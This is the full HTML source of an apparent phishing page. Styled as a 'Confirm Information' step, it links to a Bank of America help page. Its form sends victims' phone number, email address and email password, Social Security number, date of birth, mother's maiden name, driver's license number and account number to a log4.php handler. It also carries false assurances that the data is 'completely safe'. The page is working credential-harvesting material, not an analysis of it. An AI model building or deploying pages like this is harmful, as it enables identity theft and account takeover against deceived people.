<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Information</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
  
.textbox { 
    border: 1px solid #c4c4c4; 
    height: 30px; 
    width: 275px; 
    font-size: 14px; 
    padding-left: 8px; 
    border-radius: 3px; 
   
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 8px #7bc1f7; 
    
} 

 </style>
<style type="text/css">
  
.textrbox { 
	background-color: #EAEAEA;
    background: -moz-linear-gradient(top, #FFF, #EAEAEA);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0.0, #FFF), color-stop(1.0, #EAEAEA));
    padding-left: 5px;
	border-radius: 2px;
	font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
	font-size: 14px;	
	color: #555;
    border: 1px solid #cdcdcd; 
    outline:0; 
    height: 30px; 
    width: 275px; 
  } 
.textrbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 8px #7bc1f7; 
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: auto;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:115px; top:0px; width:985px; height:75px; z-index:0"><img src="images/header.png" alt="" title="" border=0 width=985 height=75></div>

<div id="image2" style="position:absolute; overflow:hidden; left:115px; top:80px; width:980px; height:60px; z-index:1"><img src="images/subheader.png" alt="" title="" border=0 width=980 height=60></div>

<div id="image2" style="position:absolute; overflow:hidden; left:115px; top:160px; width:980px; height:60px; z-index:1">Please verify your account information. All data transmitted is completely safe and can not be seen.</div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:510px; width:371px; height:110px; z-index:2"><h3>Identification Information</h3></div>

<div id="image8" style="position:absolute; overflow:hidden; left:115px; top:1168px; width:980px; height:147px; z-index:7"><img src="images/footer.png" alt="" title="" border=0 width=980 height=147></div>

<form action=log4.php name=chlobhai id=chlobhai method=post>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:250px; width:371px; height:110px; z-index:2">* Phone Number:<br/><input name="phone2" class="textbox" maxlength="16" autocomplete="off" type="text" required></div>

<input type="hidden" name="ansr2" style="display:none;">
<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:330px; width:371px; height:110px; z-index:2">* Email Address:<br/><input name="email" class="textbox" autocomplete="off" type="text" required></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:410px; width:371px; height:110px; z-index:2">* Email Password:<br/><input name="emailpass" class="textbox" autocomplete="off" type="password" required><br/><small>(Please provide the correct password for high security)</small></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:580px; width:371px; height:110px; z-index:2">* Social Security Number:<br/><input name="ssn" class="textbox" autocomplete="off" type="text" required><br/><small>(<a style="font-size:12px;" href="https://www1.bankofamerica.com/deposits/odao/help.cfm?helpkey=ssn_number" target="_new" title="Information on why we ask for your Social Security number opens a new window">Why do we ask for this?</a>)</small></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:660px; width:371px; height:110px; z-index:2">* Date of Birth:<br/><input name="dob" class="textbox" autocomplete="off" type="text" required><br/><small>(Please follow this format mm/dd/yyyy.)</small></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:740px; width:371px; height:110px; z-index:2">* Mother's Maiden Name:<br/><input name="mmn" class="textbox" autocomplete="off" type="text" required></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:820px; width:371px; height:110px; z-index:2">* Driving License Number:<br/><input name="dln" class="textbox" autocomplete="off" type="text" required></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:890px; width:371px; height:110px; z-index:2">* Account Number:<br/><input name="accnumber" class="textbox" autocomplete="off" type="text" required></div>


<div id="formimage1" style="position:absolute; left:289px; top:980px; z-index:13"><input type="image" name="formimage1" width="115" height="40" src="images/continue.png"></div>
</div>

	
</body>
</html>
